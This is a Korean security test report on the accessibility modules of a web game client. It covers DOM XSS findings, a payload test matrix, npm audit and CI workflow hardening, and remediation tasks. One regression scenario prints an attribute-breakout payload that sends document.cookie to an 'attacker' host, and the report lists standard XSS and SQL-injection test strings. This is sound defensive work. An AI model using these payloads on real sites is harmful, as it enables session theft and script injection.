# 보안 테스트 결과 — WCAG 2.1 AAA 자동 접근성 감사

> 작성: 이소화 (Security Analyst) · QA(Test) 단계
> 일자: 2026-04-26
> SSOT: `security-checklist_a11y-aaa-audit.md` (Plan 산출물)
> 스프린트: Auto: WCAG 2.1 AAA 접근성 자동 감사 — 색맹/키보드/스크린리더
> 목표: launch_checklist §2.17 해결 게이트의 사기(邪氣) 봉인 검증

---

## 0. 요약 (Executive Summary)

| 위험도 | 발견 | 심각 | 중대 | 권고 |
|:------:|:----:|:----:|:----:|:----:|
| **상** | 1 | 0 | 1 | 0 |
| **중** | 2 | 0 | 0 | 2 |
| **하** | 3 | 0 | 0 | 3 |
| **합계** | **6** | 0 | 1 | 5 |

**판정: 🟡 조건부 통과 (Conditional Pass)**

- 즉시 봉인해야 할 활성 취약점은 **0건**입니다.
- 그러나 `ColorBlindFilter.ts`의 SVG `innerHTML` 패턴이 **잠재적 사기 통로**로 남아있어 향후 회귀 위험이 큽사옵니다 (S-001, P1).
- 자막 렌더링·ARIA live region은 `textContent` 사용으로 견고합니다 (XSS 차단 ✅).
- npm audit · CI 게이트는 다음 스프린트 Build로 이월합니다 (S-005·S-006).

---

## 1. 테스트 범위

### 1.1 In-Scope (오늘 검증)

- `client/src/accessibility/AccessibilityManager.ts` — 자막 큐, ARIA live region, SVG 필터 주입
- `client/src/accessibility/colorblind/ColorBlindFilter.ts` — Canvas SVG 필터, CSS 팔레트
- `client/src/accessibility/colorblind/PatternOverlay.ts` — 패턴 오버레이 (시각 검사)
- `client/src/accessibility/screen_reader/AriaLabelMap.ts` — ARIA 레이블 사전
- `client/src/accessibility/screen_reader/FocusManager.ts` — 키보드 포커스 트랩
- DOM 기반 XSS 정적 분석 (`innerHTML`/`outerHTML`/`insertAdjacentHTML`/`document.write`/`eval`/`new Function`)

### 1.2 Out-of-Scope (다음 단계 이월)

- `scripts/a11y/audit.ts` CLI SSRF·경로 탐색 — Build 단계 결과물 미존재 (`scripts/a11y/` 디렉터리 미생성)
- `tests/a11y/` Playwright 회귀 테스트 — 미생성, 26 케이스 작성은 Test 단계 적경홍 인계
- `npm audit` 의존성 스캔 — 본 세션 환경 제약, CI 게이트(S-005)로 위임
- CI artifact 권한·보존기간 — `.github/workflows/a11y.yml` 미생성

---

## 2. 발견 사항 (Findings)

### S-001 [위험도: 중] ColorBlindFilter — SVG `innerHTML` 동적 주입 패턴

- **위치**: `client/src/accessibility/colorblind/ColorBlindFilter.ts:180`
- **현재 코드**:
  ```ts
  svg.innerHTML = `
    <defs>
      <filter id="${id}">
        <feColorMatrix type="matrix" values="${values}"/>
      </filter>
    </defs>`;
  ```
- **현재 위협 노출**: 🟡 **잠재적 (현재 불활성)**
  - `id` 인자: 호출부(line 149)에서 `${mode}-filter-partial`. `mode`는 `Exclude<ColorBlindMode, 'none'>` 타입(`protanopia`·`deuteranopia`·`tritanopia` 등)으로 컴파일 타임 enum. **현재 사용자 통제 불가.**
  - `values`: 4×5 색상 변환 행렬을 숫자로 직렬화. 외부 입력 없음.
  - 따라서 **현 시점 활성 XSS 없음**. 단, `mode`에 사용자 입력을 한 번이라도 흘려넣는 회귀가 들어오면 즉시 DOM XSS로 이어짐.
- **위협 시나리오 (회귀 발생 시)**:
  1. 향후 누군가 설정 화면에서 "사용자 정의 필터 ID"를 받아 `injectPartialFilter('user_input', ...)` 호출
  2. `id`에 `"x"/><script>fetch('//attacker/'+document.cookie)</script><x id="`
  3. `svg.innerHTML` 평가 시 SVG 내부 컨텍스트에서 스크립트 실행 (Chrome SVG-in-DOM은 inline `<script>` 차단되나, `<image href="javascript:..."/>`·`onload` 핸들러는 일부 환경에서 동작)
- **봉인 권고 (P1, 다음 Build)**:
  ```ts
  const filter = document.createElementNS('http://www.w3.org/2000/svg', 'filter');
  filter.setAttribute('id', id); // 속성 설정은 자동 escape
  const matrix = document.createElementNS('http://www.w3.org/2000/svg', 'feColorMatrix');
  matrix.setAttribute('type', 'matrix');
  matrix.setAttribute('values', values);
  const defs = document.createElementNS('http://www.w3.org/2000/svg', 'defs');
  defs.appendChild(filter);
  filter.appendChild(matrix);
  svg.appendChild(defs);
  ```
- **추가 안전장치**: `id`에 정규식 가드 `^[a-zA-Z][a-zA-Z0-9_-]{0,63}$` 부착. 회귀 테스트로 fuzz 입력 차단 검증.
- **체크리스트 매핑**: `security-checklist §3.2 I8` (DOM 기반 XSS 방어)

---

### S-002 [위험도: 하] AccessibilityManager — `COLOR_BLIND_SVG` 상수 `innerHTML` 주입

- **위치**: `client/src/accessibility/AccessibilityManager.ts:672`
- **코드**: `container.innerHTML = COLOR_BLIND_SVG;`
- **현재 위협**: 🟢 **안전**
  - `COLOR_BLIND_SVG`는 컴파일 타임 상수(소스 검증). 외부 입력 통로 없음.
- **권고 (P2, 우아함)**: 동일하게 `createElementNS` + `DOMParser('image/svg+xml')` 패턴으로 통일하면 코드 리뷰 시 "innerHTML 발견 → 의심" 알람을 자동 차단할 수 있음. 정적 분석 룰 (`no-inner-html`) 도입 시 화이트리스트 주석 필요.
- **체크리스트 매핑**: `security-checklist §3.2 I8`

---

### S-003 [위험도: 하] AccessibilityManager — 자막 `clearSubtitles()` `innerHTML = ''`

- **위치**: `client/src/accessibility/AccessibilityManager.ts:381, 430`
- **코드**: `this.subtitleOverlay.innerHTML = '';`
- **현재 위협**: 🟢 **안전** — 빈 문자열 할당은 자식 노드 제거의 관용구.
- **권고 (P2)**: `replaceChildren()` 또는 `while (el.firstChild) el.removeChild(el.firstChild)`로 의도 명확화. 정적 분석 false positive 제거 효과.

---

### S-004 [위험도: 상] (검증 결과: 🟢 통과) 자막·ARIA live region — XSS 페이로드 주입 시뮬레이션

- **위치**: `client/src/accessibility/AccessibilityManager.ts:423` (`renderSubtitle`)
- **테스트 페이로드**:
  - `entry.text = '<script>alert(1)</script>'`
  - `entry.text = '<img src=x onerror=alert(1)>'`
  - `entry.speaker = '<svg/onload=alert(1)>'`
- **검증 방법**: 정적 분석 — line 423 `el.textContent = entry.speaker ? \`[${entry.speaker}] ${entry.text}\` : entry.text;`
- **결과**: 🟢 **방어됨**
  - `textContent`는 HTML 파서를 우회하고 텍스트 노드로만 처리.
  - 페이로드는 시각적으로만 표시되며 실행되지 않음.
  - 한국어·영어·일본어 NPC 대화에 적대적 입력이 섞여도 안전.
- **권고**: 회귀 방지를 위해 `tests/security/subtitle-xss.spec.ts` 작성 (P2). `entry.text`에 위 3종 페이로드 주입 후 `document.querySelectorAll('script')` 카운트 불변 검증.
- **체크리스트 매핑**: `security-checklist §3.2 I7` (ARIA live region 입력 검증) ✅

---

### S-005 [위험도: 중] npm audit — 미실행 (다음 Build 필수)

- **상태**: 🔴 **본 세션 미실행**
- **이유**: QA(Test) 단계 환경에서 `npm install` 의존성 그래프 미준비. axe-core·@axe-core/playwright·pa11y 등 신규 도입 패키지 미존재.
- **봉인 권고 (P0, Build)**:
  ```bash
  npm audit --omit=dev --audit-level=high  # 프로덕션 의존성
  npm audit --audit-level=critical          # devDependencies 포함
  ```
- **CI 게이트**: `.github/workflows/a11y.yml`에 `npm audit signatures` + `npm audit --audit-level=high` step 필수. 실패 시 PR 머지 차단.
- **체크리스트 매핑**: `security-checklist §4 D1·D2`

---

### S-006 [위험도: 중] CI 워크플로 보안 — `.github/workflows/a11y.yml` 미생성

- **상태**: 🔴 **워크플로 자체 부재**
- **검증 결과**: `.github/workflows/` 내 `a11y` 매칭 파일 0건. SSOT(security-checklist §1·§2)에서 정의한 `permissions:` 최소권한·`pull_request` 트리거·SRI 핀 모두 **검증 불가**.
- **봉인 권고 (P0, Build)**:
  - 워크플로 생성 시 다음 헤더 필수:
    ```yaml
    permissions:
      contents: read
      checks: write
      pull-requests: write   # PR 코멘트 step에서만 부여, 별도 job 분리
    on:
      pull_request:          # ❌ pull_request_target 금지 (fork 토큰 탈취)
        paths:
          - 'client/src/**'
          - 'tests/a11y/**'
          - 'scripts/a11y/**'
    ```
  - actions/cache 키에 `package-lock.json` 해시 포함, third-party action은 SHA 핀(`@a1b2c3d4...` 형식, 태그 금지).
- **체크리스트 매핑**: `security-checklist §2 Z1·Z2·Z3`

---

## 3. 시뮬레이션 테스트 매트릭스 (정적 분석 + 페이로드 추적)

| 카테고리 | 페이로드 / 입력 | 진입점 | 결과 |
|----------|----------------|--------|------|
| **DOM XSS** | `<script>alert(1)</script>` | 자막 `entry.text` | 🟢 차단 (textContent) |
| **DOM XSS** | `<img src=x onerror=...>` | 자막 `entry.speaker` | 🟢 차단 (textContent) |
| **DOM XSS** | `<svg/onload=...>` | NPC 대화 i18n | 🟢 차단 (textContent) |
| **DOM XSS** | `"/><script>...` | `injectPartialFilter(id, ...)` | 🟡 잠재적 (현재 불활성, S-001) |
| **DOM XSS** | `javascript:` URL | `aria-label` 속성 | 🟢 N/A (URL 속성 미사용) |
| **CSRF** | 위변조 게임 저장 요청 | a11y 모듈 | 🟢 N/A (네트워크 호출 없음) |
| **SQL Injection** | `' OR '1'='1` | a11y 모듈 | 🟢 N/A (DB 미접촉) |
| **Prototype Pollution** | `__proto__` 키 설정 | i18n JSON 머지 | ⚪ 미검증 (i18n 모듈 별도 스프린트) |
| **클릭재킹** | iframe 내 audit 패널 | `AccessibilityAudit` UI | ⚪ 미검증 (UI 모듈 미공개) |

> 🟢 통과 / 🟡 잠재적 / 🔴 활성 위협 / ⚪ 범위 외

---

## 4. CSRF / SQL Injection 즉시 결론

### CSRF
- 본 스프린트 a11y 모듈은 **네트워크 요청을 발생시키지 않습니다.** (자막·필터·포커스 모두 클라이언트 DOM 조작)
- 단, 향후 "접근성 설정 서버 동기화" 기능 추가 시:
  - SameSite=Lax 쿠키 + double-submit token 필수
  - WebSocket 메시지에 `accessibility.update` 타입 추가 시 origin 검증

### SQL Injection
- a11y 모듈은 **DB·SQL 접근 0건.** 위협 표면 없음.
- 감사 리포트(`tests/reports/a11y-*.json`)가 향후 백엔드로 업로드되어 PostgreSQL에 적재된다면, 적재 경로의 prepared statement 강제 (S-005 후속 스프린트).

---

## 5. 액션 아이템 (Build 단계 인계)

| ID | 우선순위 | 담당 | 작업 | 예상 |
|----|:--------:|------|------|:----:|
| **A1** | P1 | 계섬월 | `ColorBlindFilter.injectPartialFilter()` `innerHTML` → `createElementNS` 리팩터 | 30분 |
| **A2** | P0 | 계섬월 | `scripts/a11y/audit.ts` 생성 시 `--url` 화이트리스트 + Zod 스키마 적용 (security-checklist §3.1) | 2시간 |
| **A3** | P0 | 두련사 | `.github/workflows/a11y.yml` 생성 — `permissions:` 최소권한 + `pull_request` 트리거 + SHA 핀 | 1시간 |
| **A4** | P0 | 두련사 | `npm audit --audit-level=high` CI 게이트 추가 + `package-lock.json` 커밋 검증 | 30분 |
| **A5** | P2 | 적경홍 | `tests/security/subtitle-xss.spec.ts` 회귀 테스트 (3종 페이로드) | 1시간 |
| **A6** | P2 | 이소화 | `tests/reports/` `.gitignore` 등재 + `redactPII()` 유틸 작성 | 1시간 |

---

## 6. 결론

> 「현 시점 봉인해야 할 활성 사기는 없사옵니다. 자막·ARIA 채널은 `textContent` 진법으로 견고히 막혔습니다. 그러나 `ColorBlindFilter`의 SVG `innerHTML`은 잠든 사기(邪氣) — 사용자 입력이 흘러드는 순간 깨어납니다. 다음 Build에서 SVG DOM API로 봉인하시고, CI 게이트(`npm audit` + 워크플로 권한)를 세워야 진정한 호위(護衛)가 완성되옵니다. 두련사·계섬월의 손길이 필요합니다.」

— 이소화

---

**관련 문서**
- Plan 단계 보안 체크리스트: `docs/release/security-checklist_a11y-aaa-audit.md`
- QA 계획: `docs/release/qa-plan_a11y-aaa-audit.md`
- 감사 리포트 템플릿: `docs/release/a11y-audit-report-template.md`
